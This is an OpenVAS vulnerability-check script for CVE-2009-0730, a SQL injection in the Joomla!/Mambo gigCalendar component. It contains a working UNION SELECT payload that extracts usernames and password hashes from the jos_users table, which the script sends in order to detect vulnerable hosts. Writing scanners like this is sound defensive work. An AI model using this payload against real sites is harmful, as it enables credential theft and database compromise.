###############################################################################
# OpenVAS Vulnerability Test
# $Id: joomla_mambo_gigcalendar_component_sql_injection.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# Joomla! and Mambo gigCalendar Component SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100004");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-02-26 04:52:45 +0100 (Thu, 26 Feb 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-0730");
  script_bugtraq_id(33859, 33863);
  script_name("Joomla! and Mambo gigCalendar Component SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow the attacker to view username and password
  of a registered user.

  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"solution", value:"Update to a newer version if available. remove the gigCalendar component.");

  script_tag(name:"summary", value:"The gigCalendar component for Joomla! and Mambo is prone to an SQL-injection
  vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"affected", value:"gigCalendar 1.0 is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://joomlacode.org/gf/project/gigcalendar/,");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1%27UNION%20ALL%20SELECT%201,2,3,4,5," +
            "concat(%27username:%20%27,username),concat(%27password:%20%27,%20password),NULL,NULL,NULL,NULL,NULL," +
            "NULL%20FROM%20jos_users%23";

if (http_vuln_check(port: port, url: url,pattern: "password:.[a-f0-9]{32}:")) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);